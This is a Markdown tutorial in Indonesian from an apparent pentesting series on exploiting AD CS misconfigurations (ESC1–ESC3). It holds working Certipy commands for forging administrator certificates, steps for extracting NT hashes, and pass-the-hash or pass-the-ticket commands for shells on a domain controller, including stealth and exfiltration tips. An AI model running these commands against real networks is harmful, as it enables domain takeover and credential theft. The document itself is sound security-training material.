---
id: "40"
title: "🔐 Workflow 40 — Active Directory Certificate Services (AD CS)"
category: "4. Active Directory"
categoryId: "ad"
filename: "40_adcs_workflow.md"
refs_out: ["38","39","41","42","43"]
refs_in: ["39","41","43"]
---

# 🔐 Workflow 40 — Active Directory Certificate Services (AD CS)

> **Category:** Active Directory Exploitation  
> **Difficulty:** Intermediate → Advanced  
> **Type:** Certificate Services / Privilege Escalation / PKI Abuse  
> **Prerequisites:**  
> ← [**File 39: AD Delegation**](/docs/ad-delegation)  
> ← [**File 38: AD ACL Abuse**](/docs/ad-acl-abuse)  
> **Next:**  
> → [**File 41: NTLM Relay**](/docs/ntlm-relay)  
> → [**File 43: Domain Persistence**](/docs/domain-persistence)

---

# 🎯 0. FONDASI AD CS

## 🏢 0.1 Apa Itu Active Directory Certificate Services?

**Active Directory Certificate Services (AD CS)** adalah implementasi Public Key Infrastructure (PKI) Microsoft yang digunakan untuk menerbitkan dan mengelola certificate di environment Active Directory.

Certificate dapat dipakai untuk berbagai kebutuhan legitimate:

```text
┌───────────────────────────────┐
│       ACTIVE DIRECTORY        │
│                               │
│  Users / Computers / Servers  │
└──────────────┬────────────────┘
               │
               ▼
┌───────────────────────────────┐
│             AD CS             │
│       Certificate Authority   │
└──────────────┬────────────────┘
               │
               ▼
       Digital Certificate
```

Certificate dapat digunakan untuk:

- authentication
    
- smart card logon
    
- TLS/SSL
    
- digital signature
    
- encryption
    
- service authentication
    
- machine authentication
    

Karena certificate dapat menjadi authentication material yang setara secara efektif dengan credential tertentu, salah konfigurasi AD CS dapat menjadi jalur kompromi yang sangat serius. Certipy sendiri mendeskripsikan AD CS sebagai attack surface yang dapat menghasilkan certificate yang dipakai untuk authentication dan privilege escalation.

---

## 🪪 0.1.1 Analogi: AD CS Seperti Kantor Pembuat KTP Digital

Bayangkan sebuah kota mempunyai:

```text
KANTOR IDENTITAS
```

Kantor ini memiliki kemampuan membuat:

```text
KTP
```

untuk seluruh warga.

Normalnya:

```text
Warga
  │
  │ "Saya adalah Ikmal"
  ▼
Petugas
  │
  │ memeriksa identitas
  ▼
KTP
  │
  ▼
Ikmal
```

Namun sekarang bayangkan kantor tersebut mempunyai bug:

```text
Petugas:
"Tulis saja nama siapa yang kamu mau."
```

Maka:

```text
Attacker
   │
   │ "Buat KTP Administrator"
   ▼
CA
   │
   ▼
Certificate:
Administrator
```

Jika certificate tersebut kemudian diterima sistem sebagai bukti identitas Administrator:

```text
Certificate
     │
     ▼
Authentication
     │
     ▼
Administrator
```

Inilah inti mengapa AD CS sangat powerful.

---

## 🏭 0.1.2 Kenapa AD CS Ada?

AD CS sendiri adalah teknologi legitimate.

Contoh kebutuhan enterprise:

```text
               ┌──────────────┐
               │ Enterprise   │
               │ PKI / AD CS  │
               └──────┬───────┘
                      │
          ┌───────────┼────────────┐
          │           │            │
          ▼           ▼            ▼
       User Cert   Machine Cert   TLS Cert
          │           │            │
          ▼           ▼            ▼
      Logon/Auth    Computer      HTTPS
```

Contoh:

```text
Laptop employee
      │
      └── machine certificate
             │
             ▼
       domain authentication
```

atau:

```text
Web Server
    │
    └── TLS certificate
           │
           ▼
      HTTPS service
```

Masalah muncul ketika:

```text
LEGITIMATE PKI
      │
      ▼
Misconfiguration
      │
      ▼
Attacker-controlled certificate
```

---

# 🌳 0.1.3 PKI Hierarchy di Active Directory

Struktur PKI sederhana:

```text
                    ┌──────────────────┐
                    │     ROOT CA      │
                    │  trust anchor    │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │  SUBORDINATE CA  │
                    │  / Issuing CA    │
                    └────────┬─────────┘
                             │
                  issues certificates
                             │
          ┌──────────────────┼───────────────────┐
          │                  │                   │
          ▼                  ▼                   ▼
     User Cert         Computer Cert       Server Cert
          │                  │                   │
          ▼                  ▼                   ▼
       USER01             DC01               WEB01
```

Di banyak domain environment, attacker paling tertarik pada:

```text
Certificate Authority
        +
Certificate Template
        +
Enrollment Permission
        +
Certificate Mapping
```

karena kombinasi keempatnya menentukan apakah certificate dapat digunakan untuk authentication.

---

# 🧩 0.2 Komponen Penting AD CS

|Komponen|Fungsi|Relevant untuk Attacker|
|---|---|---|
|**CA (Certificate Authority)**|Menerbitkan dan menandatangani certificate|Jika CA salah konfigurasi/terkompromi, dampaknya sangat besar|
|**Certificate Template**|Menentukan policy, EKU, subject/SAN, approval, permission, dan karakteristik certificate|Salah konfigurasi template dapat menghasilkan ESC path|
|**Enrollment Rights**|Menentukan siapa yang boleh request certificate|Low-priv user dengan enrollment ke template berbahaya menjadi kandidat|
|**EKU**|Menentukan tujuan certificate, misalnya Client Authentication|EKU authentication sangat penting untuk privilege escalation|
|**SAN**|Menyimpan identity tambahan seperti UPN/DNS|Arbitrary SAN dapat membuka impersonation path pada konfigurasi tertentu|
|**Certificate Mapping**|Menentukan bagaimana certificate dipetakan ke object AD|Mapping lemah dapat menyebabkan certificate dianggap milik account lain|

---

# 🔐 0.2.1 Certificate Authority

CA adalah pihak yang menandatangani certificate.

```text
REQUEST
   │
   ▼
   CA
   │
   │ sign
   ▼
CERTIFICATE
```

Secara sederhana:

```text
Attacker
   │
   │ request
   ▼
Certificate Authority
   │
   └── policy/template validation
              │
              ▼
        issue / deny
```

---

# 📄 0.2.2 Certificate Template

Template dapat dianggap sebagai:

```text
"Formulir + aturan"
```

Contoh aturan:

```text
Template:
┌─────────────────────────────┐
│ Who may enroll?             │
│ Domain Users                │
│                             │
│ Authentication allowed?    │
│ YES                         │
│                             │
│ Subject supplied by user?  │
│ YES                         │
│                             │
│ Manager approval?           │
│ NO                          │
└─────────────────────────────┘
```

Template seperti ini patut dicurigai.

---

# 📨 0.2.3 Enrollment Rights

Enrollment berarti:

```text
"Siapa yang boleh meminta certificate?"
```

Contoh:

```text
Domain Users
      │
      │ Enroll
      ▼
VulnerableTemplate
```

Jika template juga memiliki:

```text
Client Authentication
        +
Enrollee Supplies Subject
```

maka low-priv user dapat menjadi kandidat ESC1.

---

# 🧪 0.2.4 EKU — Extended Key Usage

EKU menjelaskan penggunaan certificate.

Contoh:

```text
Client Authentication
OID: 1.3.6.1.5.5.7.3.2
```

Contoh lain:

```text
Server Authentication
```

```text
Code Signing
```

```text
Certificate Request Agent
OID: 1.3.6.1.4.1.311.20.2.1
```

Untuk AD CS exploitation, perhatikan terutama:

```text
Client Authentication
Smart Card Logon
Certificate Request Agent
Any Purpose
```

---

# 🪪 0.2.5 SAN — Subject Alternative Name

SAN adalah extension di certificate yang dapat menyimpan identity alternatif.

Contoh:

```text
Subject:
CN=John Doe

SAN:
UPN=john@domain.local
DNS=web01.domain.local
```

Dalam kondisi vulnerable:

```text
Attacker
   │
   └── arbitrary UPN/SAN
          │
          ▼
       Certificate
          │
          ▼
      Administrator
```

> Namun pada environment modern, **SAN/UPN yang terlihat benar tidak otomatis berarti certificate dapat dipetakan sebagai account tersebut**. Strong certificate mapping dan SID extension dapat mengubah hasil attack.

---

# 🔗 0.2.6 Certificate Mapping

Server/KDC harus menjawab:

> "Certificate ini milik account AD yang mana?"

Konsep:

```text
Certificate
     │
     ▼
Certificate Mapping
     │
     ▼
AD Object
```

Contoh:

```text
certificate
   │
   ├── UPN
   ├── SID extension
   ├── issuer
   └── subject
          │
          ▼
      AD Account
```

Inilah sebabnya:

```text
"berhasil meminta certificate"
```

tidak selalu berarti:

```text
"berhasil authenticate sebagai target"
```

---

# ⚠️ 0.3 Kenapa AD CS Dangerous?

## 0.3.1 🔑 Certificate = Authentication Material

Password:

```text
USER
 │
 └── password
       │
       ▼
     Login
```

Certificate:

```text
USER
 │
 └── private key + certificate
          │
          ▼
       PKINIT
          │
          ▼
         TGT
```

Jadi:

```text
certificate
    +
private key
    │
    ▼
authentication
```

---

# ⏳ 0.3.2 Certificate Bisa Outlive Password

Misalnya:

```text
Day 1
Password = OLD_PASSWORD
Certificate = VALID
```

Password kemudian diubah:

```text
Day 30
Password = NEW_PASSWORD
```

Certificate belum tentu otomatis dicabut.

Jika certificate masih valid dan mapping masih menerima certificate tersebut:

```text
OLD PASSWORD
    X

CERTIFICATE
    ✓
```

Jadi:

> Password reset tidak secara otomatis identik dengan revocation semua certificate yang pernah diterbitkan.

Ini membuat certificate-based persistence perlu diperhatikan dalam assessment.

---

# 💥 0.3.3 Misconfigured Template = Privilege Escalation

Attack path:

```text
Low Priv User
     │
     ▼
Enroll
     │
     ▼
Vulnerable Template
     │
     ▼
Certificate
     │
     ▼
PKINIT
     │
     ▼
TGT
     │
     ▼
Privileged Authentication
```

---

# 🔄 0.3.4 Certificate → PKINIT → TGT

```text
       CERTIFICATE
            │
            │ private key
            ▼
         PKINIT
            │
            ▼
      Kerberos KDC
            │
            │ AS-REP
            ▼
           TGT
            │
            ▼
       Kerberos access
```

Konsep ini sangat penting.

Kamu tidak harus selalu memiliki:

```text
Administrator password
```

untuk memperoleh:

```text
Administrator TGT
```

jika certificate authentication berhasil dipetakan ke account Administrator.

---

# 🧠 0.3.5 Kenapa Certificate Bisa Lebih Powerful daripada Password?

Jangan pahami ini sebagai:

```text
certificate > password
```

secara mutlak.

Yang benar:

```text
Credential Type
     │
     ▼
Authentication Path
     │
     ▼
What security controls apply?
```

Certificate dapat sangat powerful karena:

```text
1. dapat digunakan melalui PKINIT
2. password reset tidak otomatis revoke certificate
3. dapat digunakan dalam service-to-service authentication
4. private key dapat dibawa terpisah dari password
5. salah mapping dapat menyebabkan impersonation
```

Tetapi certificate tetap memiliki:

```text
expiration
revocation
mapping rules
EKU restrictions
private key protection
```

---

# 📚 0.4 Recap Konsep yang Dibutuhkan

## X.509 Certificate

Certificate pada dasarnya mengikat identity dengan public key dan ditandatangani oleh issuer.

```text
Certificate
 │
 ├── Subject
 ├── Issuer
 ├── Validity
 ├── Public Key
 ├── Extensions
 └── Signature
```

---

## 🔑 Private Key vs Public Key

```text
PRIVATE KEY
    │
    └── harus dirahasiakan

PUBLIC KEY
    │
    └── boleh didistribusikan
```

Secara simplifikasi:

```text
Private Key ───────┐
                   │
                   ▼
                Certificate
                   │
                   ▼
              Authentication
```

---

## 📄 Certificate Template

Template = policy untuk certificate.

```text
Template
 │
 ├── EKU
 ├── Subject rules
 ├── SAN rules
 ├── Approval
 ├── Validity
 └── Permissions
```

---

## 📨 Enrollment

Enrollment:

```text
User
 │
 │ request
 ▼
CA
 │
 │ evaluate template
 ▼
certificate
```

---

## 🎫 PKINIT

PKINIT memungkinkan Kerberos menggunakan public key cryptography untuk initial authentication.

```text
Certificate + Private Key
            │
            ▼
          PKINIT
            │
            ▼
           KDC
            │
            ▼
           TGT
```

---

# 🧰 1. TOOLS & SETUP

## 🐍 1.1 Certipy — Primary Tool

Certipy adalah tool utama workflow ini.

Repository Certipy saat ini mencantumkan command surface seperti:

```text
account
auth
ca
cert
find
forge
ptt
relay
req
shadow
template
```

dan versi terbaru yang tercantum di repository adalah **5.1.0**. Karena syntax mengalami perubahan antar major version, selalu verifikasi `certipy --help` dan dokumentasi versi lokal.

---

## 1.1.1 📦 Install via Python

Recommended:

```bash
# Buat virtual environment agar dependency tidak merusak system Python
python3 -m venv ~/venvs/certipy

# Aktifkan virtual environment
source ~/venvs/certipy/bin/activate

# Update packaging tools
python3 -m pip install --upgrade pip

# Install Certipy
python3 -m pip install certipy-ad

# Verifikasi
certipy --help

# Tampilkan versi (gunakan opsi yang reliable)
certipy -h | head -1
# atau: pip show certipy-ad | grep Version
```

Alternatif:

```bash
# Clone source repository
git clone https://github.com/ly4k/Certipy.git

# Masuk repository
cd Certipy

# Install package
python3 -m pip install .
```

Repository resmi mencantumkan installation dan command reference untuk penggunaan ini.

---

# 🧩 1.1.2 Certipy Subcommands

|Subcommand|Fungsi|Contoh|
|---|---|---|
|`find`|Enumeration CA/template/vulnerability|`certipy find ...`|
|`req`|Request certificate|`certipy req ...`|
|`auth`|Authenticate dengan certificate|`certipy auth ...`|
|`ca`|Manage CA-related operations|`certipy ca ...`|
|`template`|Read/modify template|`certipy template ...`|
|`relay`|NTLM relay ke AD CS endpoint|`certipy relay ...`|
|`forge`|Forge certificate jika CA private key sudah diperoleh|`certipy forge ...`|
|`shadow`|Shadow Credentials|`certipy shadow ...`|
|`ptt`|Ticket injection/support|`certipy ptt ...`|
|`account`|Account management|`certipy account ...`|

Command surface ini sesuai dengan dokumentasi Certipy modern.

> Workflow ini fokus pada **`find` → `req` → `auth` → `template` → `ca` → `relay` → `shadow`**.

---

# ⚙️ 1.1.3 Konfigurasi /etc/krb5.conf untuk Lab

Kerberos tools (seperti `certipy auth -k` atau Impacket dengan `-k`) di Linux/Parrot OS sering gagal jika Kerberos configuration file (`/etc/krb5.conf`) belum disetup sesuai domain target.

```bash
# Otomatisasi setup /etc/krb5.conf untuk domain lab:
DOMAIN="CORP.LOCAL"
DC_IP="10.10.10.10"

echo "[libdefaults]
    default_realm = ${DOMAIN}
    dns_lookup_realm = false
    dns_lookup_kdc = true
    rdns = false
    forwardable = true

[realms]
    ${DOMAIN} = {
        kdc = ${DC_IP}
        admin_server = ${DC_IP}
    }

[domain_realm]
    .${DOMAIN,,} = ${DOMAIN}
    ${DOMAIN,,} = ${DOMAIN}" | sudo tee /etc/krb5.conf
```

---

# 🪟 1.2 Certify — Windows Alternative

Certify adalah tool Windows dari GhostPack.

Gunakan ketika:

```text
Attacker
   │
   ▼
Windows foothold
   │
   ▼
Certify.exe
```

Contoh:

```powershell
# Cari template yang dianggap vulnerable
.\Certify.exe find /vulnerable
```

Enumerate CA:

```powershell
# Enumerate Certificate Authorities
.\Certify.exe cas
```

Cari template tertentu:

```powershell
# Search specific certificate template
.\Certify.exe find /template:TemplateName
```

Certify juga mempunyai mode untuk menemukan client-auth related certificate opportunities. Contoh output `find /vulnerable` banyak digunakan untuk memvalidasi kondisi template/CA yang berisiko.

---

# 🔐 1.3 PKINIT Tools

PKINIT tools digunakan ketika certificate sudah diperoleh dan kita ingin bekerja dengan Kerberos secara langsung.

Tool penting:

```text
gettgtpkinit.py
    │
    └── certificate → TGT

getnthash.py
    │
    └── TGT session key → NT hash
```

Mental model:

```text
PFX
 │
 ▼
Certificate
 │
 ▼
PKINIT
 │
 ▼
TGT / ccache
 │
 ▼
UnPAC-the-hash
 │
 ▼
NT hash
```

> Tidak semua certificate dapat langsung menghasilkan NT hash. Identity mapping, PKINIT support, U2U/UnPAC conditions, dan target account policy harus sesuai.

---

# 🔎 2. ENUMERATION AD CS

## 2.1 🧭 Enumerate dengan Certipy

Set variables:

```bash
# Domain Controller IP
DC_IP="10.10.10.10"

# Active Directory domain
DOMAIN="domain.local"

# Current user
USERNAME="username"

# Current password
PASSWORD="password"
```

---

## 2.1.1 🔍 `certipy find`

```bash
# Enumerate CA, templates, permissions and detected ESC conditions
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -stdout
```

Save output:

```bash
# Save enumeration output using a prefix
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -output adcs_enum
```

Certipy mendukung output seperti text/JSON dan filtering tertentu tergantung versi.

---

# 📖 2.1.2 Cara Membaca Output `certipy find`

Contoh realistis:

```text
Certificate Authorities
  0
    CA Name                       : CORP-CA
    DNS Name                      : ca.corp.local
    Certificate Subject           : CN=CORP-CA, DC=corp, DC=local
    Web Enrollment               : Enabled

Certificate Templates
  0
    Template Name                 : UserTemplate
    Display Name                  : UserTemplate
    Certificate Authorities       : CORP-CA
    Enabled                       : True
    Client Authentication         : True
    Enrollee Supplies Subject     : True
    Certificate Name Flag         : EnrolleeSuppliesSubject
    Extended Key Usage            : Client Authentication
    Requires Manager Approval     : False
    Authorized Signatures Required: 0

    Permissions
      Enrollment Permissions
        Enrollment Rights         : CORP.LOCAL\Domain Users

      Object Control Permissions
        Write Owner               : CORP.LOCAL\Domain Admins
        Write Dacl                : CORP.LOCAL\Domain Admins

    [+] User Enrollable Principals: CORP.LOCAL\Domain Users

    [!] Vulnerabilities
      ESC1 : Enrollee supplies subject and template allows client authentication
```

Certipy memang menampilkan indikator seperti `Enrollee Supplies Subject`, `Client Authentication`, `User Enrollable Principals`, dan `ESC1` untuk kondisi yang sesuai.

---

# 🚦 2.1.3 Flag yang Harus Diperhatikan

## Template Enabled

```text
Enabled : True
```

berarti template dipublikasikan/tersedia untuk issuance melalui CA tertentu.

```text
Enabled : False
```

berarti template tersebut tidak sedang aktif untuk issuance.

Penting:

```text
Template exists
      ≠
CA currently issues it
```

---

## Enrollment Rights

Perhatikan:

```text
Enrollment Rights:
    Domain Users
```

atau:

```text
Authenticated Users
```

Jika attacker adalah anggota group tersebut:

```text
Attacker
   │
   └── can enroll
          │
          ▼
      Template
```

---

## Client Authentication

Perhatikan:

```text
Client Authentication : True
```

Ini penting karena certificate tersebut dapat menjadi candidate untuk authentication.

---

## Enrollee Supplies Subject

```text
Enrollee Supplies Subject : True
```

Ini sangat penting pada ESC1.

Mental model:

```text
Normal:
Template
  │
  └── identity controlled by template

Vulnerable:
Attacker
  │
  └── can influence subject/SAN
```

---

# 🪟 2.2 Enumerate dengan Certify

```powershell
# Enumerate certificate templates
.\Certify.exe find

# Filter hanya template yang dianggap vulnerable
.\Certify.exe find /vulnerable

# Enumerate Certificate Authorities
.\Certify.exe cas

# Enumerate template tertentu
.\Certify.exe find /template:TemplateName
```

---

# 🩸 2.3 BloodHound AD CS Data

AD CS analysis sebaiknya tidak dipahami hanya sebagai:

```text
template vulnerable
```

Tetapi:

```text
USER
 │
 ├── group membership
 │
 ├── enrollment rights
 │
 └── template/CA rights
         │
         ▼
      AD CS path
```

BloodHound dapat membantu melihat relasi antara account, group, computer, template, dan privilege.

Contoh mental model:

```text
LOW PRIV USER
      │
      │ MemberOf
      ▼
DOMAIN USERS
      │
      │ Enroll
      ▼
VULNERABLE TEMPLATE
      │
      ▼
CERTIFICATE
      │
      ▼
PRIVILEGED ACCOUNT
```

Untuk collection, gunakan collector/version yang kompatibel dengan deployment BloodHound Anda dan pastikan AD CS data collection memang didukung.

---

# 🧠 2.3.1 Pertanyaan BloodHound yang Penting

```text
1. Siapa yang dapat enroll?
2. Siapa yang dapat modify template?
3. Siapa yang dapat manage CA?
4. Template apa yang dapat menghasilkan authentication certificate?
5. Apakah ada path dari current user ke privileged principal?
```

---

# 🧾 2.4 Manual Enumeration via LDAP

## CA Objects

```bash
# LDAP base DN
BASE_DN="DC=domain,DC=local"

# Enumerate Certificate Authority objects
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "CN=$USERNAME,CN=Users,DC=domain,DC=local" \
    -w "$PASSWORD" \
    -b "CN=Public Key Services,CN=Services,CN=Configuration,$BASE_DN" \
    "(objectClass=certificationAuthority)" \
    cn dNSHostName
```

---

## Certificate Templates

```bash
# Enumerate certificate templates
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "CN=$USERNAME,CN=Users,DC=domain,DC=local" \
    -w "$PASSWORD" \
    -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$BASE_DN" \
    "(objectClass=pKICertificateTemplate)" \
    cn \
    msPKI-Certificate-Name-Flag \
    msPKI-Enrollment-Flag \
    pKIExtendedKeyUsage
```

---

# 🚨 3. ESC1 — ENROLLEE SUPPLIES SUBJECT + CLIENT AUTH

## 3.1 🔥 Konsep ESC1

ESC1 adalah salah satu AD CS abuse path yang paling dikenal.

Intinya:

```text
Attacker
   │
   │ enroll
   ▼
Vulnerable Template
   │
   │ SAN/subject can be supplied
   ▼
Certificate
   │
   │ UPN = privileged user
   ▼
Authentication
```

Kondisi penting:

```text
1. Enrollee Supplies Subject = TRUE
2. Client Authentication EKU
3. Attacker has enrollment rights
4. Certificate can actually be used for authentication/mapping
```

Certipy secara eksplisit mendeteksi kombinasi Enrollee Supplies Subject + Client Authentication sebagai ESC1 candidate.

---

# 3.1.1 🧩 Kenapa Dangerous?

Normal:

```text
Attacker
 │
 └── request certificate
          │
          ▼
       Attacker
```

ESC1-style:

```text
Attacker
 │
 └── request certificate
          │
          └── UPN = Administrator
                     │
                     ▼
                 Certificate
                     │
                     ▼
                  PKINIT
```

Jadi vulnerability bukan sekadar:

```text
"bisa membuat certificate"
```

tetapi:

```text
"bisa memengaruhi identity yang diikat certificate"
```

---

# 3.1.2 📊 ESC1 Preconditions

|Kondisi|Harus ada?|
|---|--:|
|Template enabled/published|✅|
|Attacker enrollment rights|✅|
|Enrollee Supplies Subject|✅|
|Client Authentication / usable authentication EKU|✅|
|Request tidak diblok approval policy|Biasanya ✅|
|Certificate mapping mengizinkan impersonation|✅|
|Target account dapat digunakan untuk PKINIT|✅|

> **Nuance modern:** UPN spoofing saja tidak selalu cukup pada environment dengan strong certificate mapping/SID extension.

---

# 🕵️ 3.2 Identifikasi ESC1

Cari:

```text
[!] Vulnerabilities
    ESC1 : Enrollee supplies subject and template allows client authentication
```

Kemudian cari:

```text
Enrollee Supplies Subject : True
Client Authentication     : True
```

dan:

```text
[+] User Enrollable Principals
```

Contoh:

```text
[+] User Enrollable Principals:
    CORP.LOCAL\Domain Users
```

Artinya:

```text
Domain Users
     │
     └── attacker mungkin memiliki enrollment rights
```

Certipy docs menunjukkan field-field tersebut sebagai indikator langsung ESC1.

---

# 🔬 3.2.1 Manual Verification Checklist

```text
[ ] Template Enabled = True
[ ] Client Authentication = True
[ ] Enrollee Supplies Subject = True
[ ] Enrollment Rights includes my user/group
[ ] Manager Approval = False
[ ] Authorized Signatures Required = 0
[ ] CA publishes this template
[ ] Target account is valid
[ ] Certificate mapping is compatible
```

---

# 💥 3.3 Exploitation ESC1

Set variables:

```bash
# Domain
DOMAIN="domain.local"

# DC
DC_IP="10.10.10.10"

# Attacker account
USERNAME="username"

# Attacker password
PASSWORD="password"

# CA display name
CA_NAME="CORP-CA"

# Vulnerable template
TEMPLATE="VulnTemplate"

# Target user
IMPERSONATE="administrator@$DOMAIN"
```

Request:

```bash
# Request certificate from vulnerable template
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -ca "$CA_NAME" \
    -template "$TEMPLATE" \
    -upn "$IMPERSONATE" \
    -dc-ip "$DC_IP"
```

Penjelasan:

```text
-u       → account yang melakukan enrollment
-p       → password account tersebut
-ca      → Certificate Authority name
-template→ certificate template
-upn     → UPN yang diminta pada certificate
-dc-ip   → domain controller
```

Command surface `req` memang mendukung identity fields seperti UPN/SAN pada template yang mengizinkannya.

---

## 3.3.1 Contoh Output

```text
Certipy v5.x - by Oliver Lyak

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 42
[*] Got certificate with UPN 'administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saving certificate and private key to 'administrator.pfx'
```

Hasil penting:

```text
administrator.pfx
```

---

# 🔐 3.3.2 Authenticate dengan PFX

```bash
# Authenticate using certificate + private key
certipy auth \
    -pfx administrator.pfx \
    -dc-ip "$DC_IP"
```

Output realistis:

```text
Certipy v5.x - by Oliver Lyak

[*] Using principal: administrator@domain.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got NT hash for 'administrator@domain.local':
31d6cfe0d16ae931b73c59d7e0c089c0
```

Certipy `auth` memang digunakan untuk certificate-based authentication dan dapat menghasilkan Kerberos cache; pengambilan NT hash bergantung pada kondisi PKINIT/UnPAC dan konfigurasi target.

---

# 🧠 3.3.3 Pahami Hasilnya

Jika berhasil:

```text
administrator.pfx
       │
       ▼
certipy auth
       │
   ┌───┴─────────┐
   ▼             ▼
TGT/ccache     NT hash
```

Yang didapat bukan sekadar:

```text
certificate file
```

tetapi dapat berkembang menjadi:

```text
certificate
   ↓
Kerberos TGT
   ↓
ccache
   ↓
authenticated session
```

dan dalam kondisi yang mendukung:

```text
TGT
 ↓
UnPAC
 ↓
NT hash
```

---

# 💻 3.4 Dari Hash/Ticket ke Shell

## Option 1 — Pass-the-Hash

```bash
# Target DC
TARGET="$DC_IP"

# Administrative username
USER="administrator"

# NTLM hash hasil certificate authentication
NTLM_HASH="NTLM_HASH"

# Authenticate via NTLM hash
python3 /opt/impacket/examples/psexec.py \
    -hashes ":$NTLM_HASH" \
    "$USER@$TARGET"
```

---

## Option 2 — Pass-the-Ticket

```bash
# Point Kerberos tools to the certificate-derived cache
export KRB5CCNAME="$PWD/administrator.ccache"

# Verify the cache
klist
```

Kemudian:

```bash
# Kerberos-authenticated WMI execution
python3 /opt/impacket/examples/wmiexec.py \
    -k \
    -no-pass \
    "$DOMAIN/administrator@$TARGET"
```

---

## Option 3 — Evil-WinRM (Pass-the-Hash over WinRM)

Sangat cocok jika port 5985 (WinRM) terbuka di target host:

```bash
# Authenticate via NTLM Hash dengan Evil-WinRM
evil-winrm -i "$TARGET" -u "$USER" -H "$NTLM_HASH"
```

---

## Option 4 — NetExec / CrackMapExec (Pass-the-Hash Execution & Verification)

Cocok untuk verifikasi cepat kredensial/hash dan eksekusi command via SMB/WinRM:

```bash
# Verify credentials & check Admin rights (Pwn3d!)
netexec smb "$TARGET" -u "$USER" -H "$NTLM_HASH"

# Execute command via SMB
netexec smb "$TARGET" -u "$USER" -H "$NTLM_HASH" -x "whoami /priv"

# Execute command via WinRM
netexec winrm "$TARGET" -u "$USER" -H "$NTLM_HASH" -x "whoami"
```

---

## Option 5 — smbclient (Interactive SMB Access)

Cocok untuk browsing share C$ atau ADMIN$ tanpa spawn full interactive shell:

```bash
# Connect ke C$ share menggunakan NT Hash
smbclient "//${TARGET}/C$" -U "${USER}%${NTLM_HASH}" --pw-nt-hash "$NTLM_HASH"
```

---

## 💡 Kapan Pilih Yang Mana?

- **Evil-WinRM**: Pilihan terbaik jika WinRM (5985) open. Shell jauh lebih stabil, support file upload/download & PowerShell script loading.
- **Impacket (psexec/wmiexec)**: Pilihan utama untuk SMB/RPC access jika WinRM closed. `wmiexec` lebih stealthy daripada `psexec`.
- **NetExec**: Terbaik untuk quick verification, lateral movement check, dan command execution singkat.
- **smbclient**: Terbaik untuk exfiltration/browsing file share secara cepat tanpa memicu execution alert.

---

# 🧠 3.4.1 PFX vs ccache vs kirbi

Ini salah satu kebingungan terbesar pemula.

|File|Isi/Kegunaan|Umumnya dipakai oleh|
|---|---|---|
|`.pfx`|Certificate + private key, biasanya dalam PKCS#12 container|Certipy / OpenSSL / certificate tools|
|`.ccache`|Kerberos credential cache|Linux Kerberos / Impacket|
|`.kirbi`|Kerberos ticket format Windows/Rubeus-style|Rubeus / Windows ticket workflows|

Mental model:

```text
PFX
 │
 │ certificate authentication
 ▼
TGT
 │
 ├── Windows representation → KIRBI
 │
 └── Linux representation   → CCACHE
```

---

# 🟡 4. ESC2 — ANY PURPOSE / NO EKU

## 4.1 🧠 Konsep ESC2

ESC2 terjadi ketika template memiliki:

```text
Any Purpose EKU
```

atau:

```text
No EKU restrictions
```

Any Purpose memiliki OID:

```text
2.5.29.37.0
```

Any Purpose memperluas kegunaan certificate dan pada kondisi tertentu juga dapat berperan sebagai Enrollment Agent capability. Certipy mendeteksi Any Purpose/no-EKU sebagai ESC2 candidate.

---

# 4.1.1 Diagram ESC2

```text
Low Priv User
     │
     │ enroll
     ▼
Any Purpose Template
     │
     ▼
Any Purpose Certificate
     │
     ├── authentication
     ├── enrollment-agent capability
     └── additional uses
```

---

# 4.2 🔎 Identifikasi ESC2

Cari:

```text
Any Purpose : True
```

atau:

```text
Extended Key Usage:
    Any Purpose
```

dan:

```text
[!] Vulnerabilities
    ESC2 : Template can be used for any purpose
```

Contoh:

```text
Template Name              : AnyPurpose
Enabled                    : True
Any Purpose                : True
Enrollment Agent           : True
User Enrollable Principals : DOMAIN\Domain Users

[!] Vulnerabilities
    ESC2 : Template can be used for any purpose.
```

---

# 4.3 💥 Exploitation ESC2

Pertama request certificate untuk attacker:

```bash
# Request certificate from Any Purpose template
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -ca "$CA_NAME" \
    -template "AnyPurpose" \
    -dc-ip "$DC_IP"
```

Output:

```text
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with UPN 'username@domain.local'
[*] Saving certificate and private key to 'username.pfx'
```

Kemudian, pada attack path yang memang mendukung Enrollment Agent abuse, certificate tersebut dapat digunakan sebagai agent certificate.

---

## 4.3.1 🧩 ESC2 Tidak Sama dengan "langsung Administrator"

Penting:

```text
ESC2
 ↓
Any Purpose certificate
```

tidak berarti:

```text
ESC2
 ↓
Administrator langsung
```

Ada kemungkinan memerlukan:

```text
ESC2
 +
suitable target template
 +
target enrollment condition
 =
privilege escalation
```

---

# 🟠 5. ESC3 — CERTIFICATE REQUEST AGENT

## 5.1 🧠 Konsep ESC3

ESC3 berhubungan dengan:

```text
Certificate Request Agent
```

OID:

```text
1.3.6.1.4.1.311.20.2.1
```

Model sederhana:

```text
ATTACKER
   │
   │ obtain Enrollment Agent certificate
   ▼
AGENT CERTIFICATE
   │
   │ request on behalf of
   ▼
TARGET USER
   │
   ▼
TARGET CERTIFICATE
   │
   ▼
AUTHENTICATION
```

Certipy mendeskripsikan ESC3 sebagai attack path yang biasanya melibatkan **dua template**: template agent dan template target.

---

# 5.1.1 🎭 Kenapa Enrollment Agent Berbahaya?

Use case legitimate:

```text
HELPDESK
   │
   └── enroll certificate
         │
         └── on behalf of user
```

Tetapi jika low-priv attacker bisa menjadi Enrollment Agent:

```text
Attacker
   │
   └── Enrollment Agent certificate
           │
           ▼
       Administrator
```

---

# 5.2 🔎 Identifikasi ESC3

Cari template agent:

```text
Enrollment Agent : True
```

dan:

```text
Extended Key Usage:
    Certificate Request Agent
```

serta:

```text
User Enrollable Principals
```

